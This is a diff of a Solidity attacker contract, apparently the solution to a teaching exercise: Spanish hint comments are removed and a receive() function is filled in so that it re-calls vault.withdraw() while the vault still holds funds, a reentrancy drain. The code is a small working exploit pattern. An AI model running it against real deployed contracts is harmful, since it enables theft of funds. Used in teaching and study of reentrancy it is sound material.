@@ -18,24 +18,16 @@ contract SimpleVaultAttacker {
         owner = msg.sender;
     }
 
-    // Ya implementado: deposita DRAIN_AMOUNT y hace una primera retirada.
-    // Esto por sí solo NO es el exploit -- sin completar receive(), esta
-    // función se comporta como una retirada normal y honesta.
     function attack() external payable {
         require(msg.value == DRAIN_AMOUNT, "send 1 ether");
         vault.deposit{value: DRAIN_AMOUNT}();
         vault.withdraw();
     }
 
-    // TODO: aquí vive el exploit. Mientras vault.withdraw() está "a medio
-    // ejecutar" (ya te envió el ETH, pero todavía no puso tu balance a 0),
-    // la EVM te cede el control aquí.
-    //
-    // Pista: comprueba cuánto ETH le queda todavía al vault
-    // (address(vault).balance) y, si es al menos DRAIN_AMOUNT, vuelve a
-    // llamar a vault.withdraw().
     receive() external payable {
-        // completa aquí
+        if (address(vault).balance >= DRAIN_AMOUNT) {
+            vault.withdraw();
+        }
     }
 
     function collect() external {
